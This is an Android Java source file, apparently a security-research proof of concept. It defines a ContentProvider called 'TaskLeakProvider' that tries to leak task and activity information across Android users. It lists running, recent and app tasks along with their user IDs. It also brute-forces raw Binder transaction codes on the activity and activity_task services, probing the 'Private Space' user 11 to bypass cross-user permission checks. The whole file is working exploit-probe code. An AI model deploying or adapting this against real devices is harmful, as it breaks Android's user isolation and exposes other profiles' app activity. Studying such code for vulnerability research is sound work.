package com.poc.crossuser;

import android.app.ActivityManager;
import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;
import java.util.List;

public class TaskLeakProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        Context ctx = getContext();
        ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);

        // === 1. getRunningTasks (deprecated but may still work) ===
        cursor.addRow(new Object[]{"=== getRunningTasks(100) ===", ""});
        try {
            List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(100);
            cursor.addRow(new Object[]{"running_task_count", String.valueOf(tasks.size())});
            for (int i = 0; i < tasks.size() && i < 20; i++) {
                ActivityManager.RunningTaskInfo t = tasks.get(i);
                String info = "id=" + t.taskId;
                if (t.baseActivity != null) {
                    info += " base=" + t.baseActivity.flattenToShortString();
                }
                if (t.topActivity != null) {
                    info += " top=" + t.topActivity.flattenToShortString();
                }
                info += " userId=" + (t.taskId >> 16); // extract userId from taskId if encoded
                cursor.addRow(new Object[]{"task_" + i, info});
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"getRunningTasks", "SEC:" + trunc(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getRunningTasks", "ERR:" + e.getClass().getSimpleName() + ":" + trunc(e.getMessage())});
        }

        // === 2. getRecentTasks ===
        cursor.addRow(new Object[]{"=== getRecentTasks(100) ===", ""});
        try {
            List<ActivityManager.RecentTaskInfo> recent = am.getRecentTasks(100, 0);
            cursor.addRow(new Object[]{"recent_task_count", String.valueOf(recent.size())});
            for (int i = 0; i < recent.size() && i < 30; i++) {
                ActivityManager.RecentTaskInfo t = recent.get(i);
                int userId = -1;
                try {
                    java.lang.reflect.Field f = t.getClass().getField("userId");
                    userId = f.getInt(t);
                } catch (Exception ignored) {}
                String info = "id=" + t.taskId + " userId=" + userId;
                if (t.baseActivity != null) {
                    info += " base=" + t.baseActivity.flattenToShortString();
                }
                if (t.topActivity != null) {
                    info += " top=" + t.topActivity.flattenToShortString();
                }
                if (t.origActivity != null) {
                    info += " orig=" + t.origActivity.flattenToShortString();
                }
                cursor.addRow(new Object[]{"recent_" + i, info});
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"getRecentTasks", "SEC:" + trunc(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getRecentTasks", "ERR:" + e.getClass().getSimpleName() + ":" + trunc(e.getMessage())});
        }

        // === 3. Raw Binder: IActivityTaskManager.getTasks ===
        cursor.addRow(new Object[]{"=== Raw Binder: activity_task service ===", ""});
        IBinder atBinder = svc("activity_task");
        if (atBinder != null) {
            String atDesc = "android.app.IActivityTaskManager";
            // Try TX code for getTasks - need to find the right one
            // In AOSP, getTasks is typically early in the AIDL interface
            for (int tx = 1; tx <= 5; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(atDesc);
                    data.writeInt(10); // maxNum
                    data.writeInt(0); // filterOnlyVisibleRecents
                    data.writeInt(0); // keepIntentExtra
                    data.writeInt(0); // displayId
                    atBinder.transact(tx, data, reply, 0);
                    reply.readException();
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"atm_tx" + tx, "OK avail=" + avail});
                } catch (SecurityException e) {
                    cursor.addRow(new Object[]{"atm_tx" + tx, "SEC:" + trunc(e.getMessage())});
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"atm_tx" + tx, "ERR:" + e.getClass().getSimpleName() + ":" + trunc(e.getMessage())});
                } finally { data.recycle(); reply.recycle(); }
            }
        } else {
            cursor.addRow(new Object[]{"activity_task_binder", "null"});
        }

        // === 4. isUserRunning via ActivityManager Binder (already in V-237) ===
        cursor.addRow(new Object[]{"=== AMS.isUserRunning (same profile group bypass) ===", ""});
        IBinder amBinder = svc("activity");
        if (amBinder != null) {
            String amDesc = "android.app.IActivityManager";
            // isUserRunning TX varies, but we know it from the IPC
            // Try calling isUserRunning for user 11
            for (int tx = 50; tx <= 60; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(amDesc);
                    data.writeInt(11); // userId = Private Space
                    data.writeInt(0); // flags
                    amBinder.transact(tx, data, reply, 0);
                    reply.readException();
                    int result = reply.readInt();
                    cursor.addRow(new Object[]{"ams_tx" + tx + "_u11", "result=" + result});
                    break; // Found a working TX
                } catch (SecurityException e) {
                    if (e.getMessage() != null && e.getMessage().contains("INTERACT_ACROSS_USERS")) {
                        cursor.addRow(new Object[]{"ams_tx" + tx + "_u11", "SEC(INTERACT)"});
                    }
                    // Don't log all misses
                } catch (Exception e) {
                    // Skip non-matching TX codes
                } finally { data.recycle(); reply.recycle(); }
            }
        }

        // === 5. getAppTasks (per-app task list) ===
        cursor.addRow(new Object[]{"=== getAppTasks() ===", ""});
        try {
            List<ActivityManager.AppTask> appTasks = am.getAppTasks();
            cursor.addRow(new Object[]{"app_task_count", String.valueOf(appTasks.size())});
            for (int i = 0; i < appTasks.size() && i < 10; i++) {
                ActivityManager.RecentTaskInfo taskInfo = appTasks.get(i).getTaskInfo();
                int userId2 = -1;
                try {
                    java.lang.reflect.Field f = taskInfo.getClass().getField("userId");
                    userId2 = f.getInt(taskInfo);
                } catch (Exception ignored) {}
                String s = "id=" + taskInfo.taskId + " userId=" + userId2;
                if (taskInfo.baseActivity != null) s += " " + taskInfo.baseActivity.flattenToShortString();
                cursor.addRow(new Object[]{"apptask_" + i, s});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"getAppTasks", "ERR:" + trunc(e.getMessage())});
        }

        return cursor;
    }

    private String trunc(String s) {
        if (s == null) return "null";
        return s.length() > 150 ? s.substring(0, 150) : s;
    }

    private IBinder svc(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) { return null; }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
